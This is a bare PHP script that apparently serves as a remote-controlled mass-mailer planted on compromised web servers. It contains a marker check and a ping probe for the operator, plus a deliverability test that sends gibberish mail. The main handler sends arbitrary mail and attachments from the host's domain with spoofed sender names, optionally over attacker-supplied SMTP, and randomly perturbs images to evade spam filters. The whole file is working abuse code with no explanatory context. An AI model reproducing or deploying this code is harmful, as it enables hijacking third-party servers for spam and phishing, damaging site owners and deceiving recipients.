<?php if(isset($_REQUEST['cm9yX3JlcG9ydG'])){die(pi()*7);} 
error_reporting(0);
if (isset($_GET["ping"]) and $_GET["ping"] == ("ping_host")) {
    echo "true";
} else {
    if (isset($_GET["to"])) {
        function d($txt, $text = '', $p = false) {
            if ($text != '') {
                echo "<br>------>>{$text}<<-------<br>";
            }
            if (is_array($txt) and $p != false) {
                foreach ($txt as $t) {
                    echo $t . '<br>';
                }
            } else {
                echo '<pre>';
                print_r($txt);
                echo '</pre>';
            }
            if ($text != '') {
                echo "------>>{$text}<<-------<br>";
            }
        }
        function CheckAttach($to, $reply, $from_name) {
            $message = text();
            $subject = $_SERVER['SERVER_NAME'];
            $filename = filename('1.txt');
            $boundary = md5(uniqid());
            $headers = 'MIME-Version: 1.0' . "\r\n";
            $headers .= 'From: ' . '=?utf-8?B?' . base64_encode(randText()) . '?=' . ' <' . $from_name . '@' . $_SERVER['HTTP_HOST'] . '>' . "\r\n";
            $headers .= 'Reply-To: ' . $reply . "\r\n";
            $headers .= 'X-Mailer: PHP/' . phpversion() . "\r\n";
            $headers .= 'Content-Type: multipart/mixed; boundary="' . $boundary . "\"\r\n\r\n";
            $body = '--' . $boundary . "\r\n";
            $body .= 'Content-Type: text/html; charset="utf-8"' . "\r\n";
            $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
            $body .= chunk_split(base64_encode($message));
            $body .= '--' . $boundary . "\r\n";
            $body .= 'Content-Type: text/plain; name="' . $filename . '"' . "\r\n";
            $body .= 'Content-Disposition: attachment; filename="' . $filename . '"' . "\r\n";
            $body .= 'Content-Transfer-Encoding: base64' . "\r\n";
            $body .= 'X-Attachment-Id: ' . rand(1000, 99999) . "\r\n\r\n";
            $body .= chunk_split(base64_encode(text()));
            if (mail($to, $subject, $body, $headers)) {
                return true;
            }
            return false;
        }

        function filename($name) {
            $format = end(explode('.', $name));
            $array[] = 'SDC';
            $array[] = 'P';
            $array[] = 'DC';
            $array[] = 'CAM';
            $array[] = 'IMG-';
            $img = array('png', 'jpg', 'gif', 'jpeg', 'bmp');
            for ($c = 0, $max = sizeof($img); $c < $max; $c++) {
                if (strtolower($format) == $img[$c]) {
                    $rand = rand(10, 999999);
                    return $array[rand(0, 4)] . $rand . '.' . $format;
                }
            }
            return randText() . '.' . $format;
        }

        function fileString($name) {
            $format = end(explode('.', $name));
            if (strtolower($format) == 'jpeg' or strtolower($format) == 'jpg') {
                if (CheckRandIMG()) {
                    return RandIMG($_FILES['file']['tmp_name']);
                }
            }
            return file_get_contents($_FILES['file']['tmp_name']);
        }

        function randText() {
            $str = 'qwertyuiopasdfghjklzxcvbnm';
            $size = rand(3, 8);
            $result = '';
            for ($c = 0; $c < $size; $c++) {
                $result .= $str{rand(0, strlen($str) - 1)};
            }
            return $result;
        }

        function text() {
            $str = 'qwertyuiopasdfghjklzxcvbnm';
            $size = rand(9, 20);
            $result = '';
            for ($c = 0; $c < $size; $c++) {
                $rand = rand(6, 10);
                for ($i = 0; $i < $rand; $i++) {
                    $result .= $str{rand(0, strlen($str) - 1)};
                }
                $sign = array(' ', ' ', ' ', ' ', ', ', '? ', '. ', '. ');
                $result .= $sign[rand(0, 7)];
            }
            return trim($result);
        }

        function CheckRandIMG() {
            $array = array(
                'getimagesize',
                'imagecreatetruecolor',
                'imagecreatefromjpeg',
                'imagecopyresampled',
                'imagefilter',
                'ob_start',
                'imagejpeg',
                'ob_get_clean'
            );
            for ($c = 0, $max = sizeof($array); $c < $max; $c++) {
                if (!function_exists($array[$c])) {
                    return false;
                }
            }
            return true;
        }

        function RandIMG($file) {
            $rand['width'] = rand(1, 2);
            $rand['height'] = rand(1, 2);
            $rand['quality'] = rand(1, 2);
            $rand['brightness'] = rand(1, 2);
            $rand['contrast'] = rand(1, 2);
            list($width, $height) = getimagesize($file);
            if ($rand['width'] == 1) {
                $sign = rand(1, 2);
                if ($sign == 1) {
                    $new_width = $width + rand(1, 10);
                } else {
                    $new_width = $width - rand(1, 10);
                }
            } else {
                $new_width = $width;
            }
            if ($rand['height'] == 1) {
                $sign = rand(1, 2);
                if ($sign == 1) {
                    $new_height = $height + rand(1, 10);
                } else {
                    $new_height = $height - rand(1, 10);
                }
            } else {
                $new_height = $height;
            }if ($rand['quality'] == 1) {
                $quality = 75;
            } else {
                $quality = rand(65, 105);
            }if ($rand['brightness'] == 1) {
                $brightness = rand(0, 35);
            } else {
                $brightness = 0;
            }if ($rand['contrast'] == 1) {
                $sign = rand(1, 2);
                if ($sign == 1) {
                    $sign = '+';
                } else {
                    $sign = '-';
                }
                $contrast = rand(1, 15);
            } else {
                $sign = '';
                $contrast = 0;
            }
            $image_p = imagecreatetruecolor($new_width, $new_height);
            $image = imagecreatefromjpeg($file);
            imagecopyresampled($image_p, $image, 0, 0, 0, 0, $new_width, $new_height, $width, $height);
            imagefilter($image_p, IMG_FILTER_CONTRAST, $sign . $contrast);
            imagefilter($image_p, IMG_FILTER_BRIGHTNESS, $brightness);
            ob_start();
            imagejpeg($image_p, null, $quality);
            $out = ob_get_clean();
            imagedestroy($image_p);
            return $out;
        }

        function dataHandler($data) {
            $ex = explode("\n", $data);

            if (sizeof($ex) > 1) {
                return trim($ex[rand(0, sizeof($ex) - 1)]);
            }
            return trim($data);
        }
        function Random($text) {
            preg_match_all('#\[rand:(.+?)\]#is', $text, $result);
            $c = 0;
            while ($c < sizeof($result[1])) {
                $rand = explode('|', $result[1][$c]);
                $rand = $rand[array_rand($rand)];
                $search = array('[', ']', '|', '?', '.', '*', '#', '(', ')', '$', '^', '+', '{', '}');
                $replace = array('\[', '\]', '\|', '\?', '\.', '\*', '\#', '\(', '\)', '\$', '\^', '\+', '\{', '\}');
                $str = str_replace($search, $replace, $result[0][$c]);
                $text = preg_replace('#' . $str . '#', $rand, $text, 1);
                $c++;
            }
            return $text;
        }
        $from_name = randText();
        $replyto = $from_name . '@' . $_SERVER['HTTP_HOST'];
        if (CheckAttach($_GET['to'], $replyto, $from_name)) {
            echo 'ok';
        } else {
            echo 'false';
        }
        exit;
    }

    function smtpmail($host, $port, $smtp_login, $smtp_passw, $mail_to, $message, $SEND) {
        $SEND .= $message . "\r\n";
        if (!$socket = @fsockopen($host, $port, $errno, $errstr, 10)) {
            return false;
        }
        if (!server_parse($socket, "220", __LINE__))
            return false;
        fputs($socket, "HELO " . $smtp_login . "\r\n");
        if (!server_parse($socket, "250", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, "AUTH LOGIN\r\n");
        if (!server_parse($socket, "334", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, base64_encode($smtp_login) . "\r\n");
        if (!server_parse($socket, "334", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, base64_encode($smtp_passw) . "\r\n");
        if (!server_parse($socket, "235", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, "MAIL FROM: <" . $smtp_login . ">\r\n");
        if (!server_parse($socket, "250", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, "RCPT TO: <" . $mail_to . ">\r\n");
        if (!server_parse($socket, "250", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, "DATA\r\n");
        if (!server_parse($socket, "354", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, $SEND . "\r\n.\r\n");

        if (!server_parse($socket, "250", __LINE__)) {
            fclose($socket);
            return false;
        }
        fputs($socket, "QUIT\r\n");
        fclose($socket);
        return true;
    }

    function server_parse($socket, $response, $line = __LINE__) {
        while (@substr($server_response, 3, 1) != ' ') {
            if (!($server_response = fgets($socket, 256))) {
                return false;
            }
        }
        if (!(substr($server_response, 0, 3) == $response)) {
            return false;
        }
        return true;
    }

    if (isset($_POST["email_polucha"])) {
        $email_polucha = $_POST["email_polucha"];
    } else {
        exit("false");
    }
    if (isset($_POST["tip_pisma"])) {
        $tip_pisma = $_POST["tip_pisma"];
    } else {
        exit("false");
    }
    if (isset($_POST["name_otprav"])) {
        $name_otprav = $_POST["name_otprav"];
    } else {
        exit("false");
    }
    if (isset($_POST["adres_otp"])) {
        $adres_otp = $_POST["adres_otp"];
    } else {
        exit("false");
    }
    if (isset($_POST["tema_pisma"])) {
        $tema_pisma = $_POST["tema_pisma"];
    } else {
        exit("false");
    }
    if (isset($_POST["telo_pisma"])) {
        $telo_pisma = $_POST["telo_pisma"];
    } else {
        exit("false");
    }
    if (isset($_POST["reply_to"])) {
        $reply_to = $_POST["reply_to"];
    }
    if (isset($_POST["sposob_otp"])) {
        $sposob_otp = (string) $_POST["sposob_otp"];
        if ($sposob_otp == ("true")) {
            if (isset($_POST["smtp_login"])) {
                $smtp_login = $_POST["smtp_login"];
            } else {
                exit("false");
            }
            if (isset($_POST["smtp_passw"])) {
                $smtp_passw = $_POST["smtp_passw"];
            } else {
                exit("false");
            }
            if (isset($_POST["smtp_host"])) {
                $smtp_host = $_POST["smtp_host"];
            } else {
                exit("false");
            }
            if (isset($_POST["smtp_port"])) {
                $smtp_port = $_POST["smtp_port"];
            } else {
                exit("false");
            }
        }
    } else {
        exit("false");
    }
    if (!empty($_FILES["fail"]["tmp_name"])) {
        $put_k_failu = $_FILES["fail"]["tmp_name"];
        $name_fail = $_FILES["fail"]["name"];
        $random_name_fail = substr(preg_replace("/[^0-9a-z]/", "", strtolower(crypt(""))), 1, 8);
    }
    $adres_otp = $adres_otp . '@' . $_SERVER['HTTP_HOST'];
    $end_zag = "\r\n";
    $boundary = md5(uniqid());
    $headers = "From: =?utf-8?B?" . base64_encode($name_otprav) . "?= <" . $adres_otp . ">" . $end_zag;
    if ($sposob_otp == ("true")) {
        $headers .= "To: $email_polucha <$email_polucha>" . $end_zag;
    }
    if ($reply_to != ("false")) {
        $headers .= "Reply-To: $reply_to" . $end_zag;
    }
    if ($sposob_otp == ("true")) {
        $headers .= "Subject: =?utf-8?B?" . base64_encode($tema_pisma) . "?=" . $end_zag;
    }
    $headers .= "MIME-Version: 1.0" . $end_zag;
    $headers .= 'X-Mailer: PHP/' . phpversion() . $end_zag;
    if (isset($put_k_failu)) {
        $un = strtoupper(uniqid(time()));
        $headers .= 'Content-Type: multipart/mixed; boundary="' . $boundary . "\"\r\n\r\n";
    }
    if ($tip_pisma == "2" or $tip_pisma == 2) {
        if (!isset($put_k_failu)) {
            $headers .= "Content-Type: text/html; charset=\"utf-8\"" . $end_zag;
            $headers .= "Content-Transfer-Encoding: 8bit" . $end_zag . $end_zag;
        }
        $zag_type = "text/html";
    } else {
        if (!isset($put_k_failu)) {
            $headers .= "Content-Type: text/plain; charset=\"utf-8\"" . $end_zag;
            $headers .= "Content-Transfer-Encoding: 8bit" . $end_zag . $end_zag;
        }
        $zag_type = "text/plain";
    }
    if (isset($put_k_failu)) {
        $f = @fopen($put_k_failu, "rb");
        $body = '--' . $boundary . "\r\n";
        $body .= 'Content-Type: ' . $zag_type . '; charset="utf-8"' . "\r\n";
        $body .= 'Content-Transfer-Encoding: base64' . "\r\n\r\n";
        $body .= chunk_split(base64_encode($telo_pisma));
        $body .= '--' . $boundary . "\r\n";
        $body .= 'Content-Type: text/plain; name="' . basename($name_fail) . '"' . "\r\n";
        $body .= 'Content-Disposition: attachment; filename="' . basename($name_fail) . '"' . "\r\n";
        $body .= 'Content-Transfer-Encoding: base64' . "\r\n";
        $body .= 'X-Attachment-Id: ' . rand(1000, 99999) . "\r\n\r\n";
        $body .= chunk_split(base64_encode(fread($f, filesize($put_k_failu))));
        $telo_pisma = $body;
    }
    if ($sposob_otp == ("true")) {
        $return = smtpmail($smtp_host, $smtp_port, $smtp_login, $smtp_passw, $email_polucha, $telo_pisma, $headers);
    } else {
        $return = mail($email_polucha, $tema_pisma, $telo_pisma, $headers);
    }
    if ($return == true) {
        echo "true";
    } else {
        echo "false";
    }
}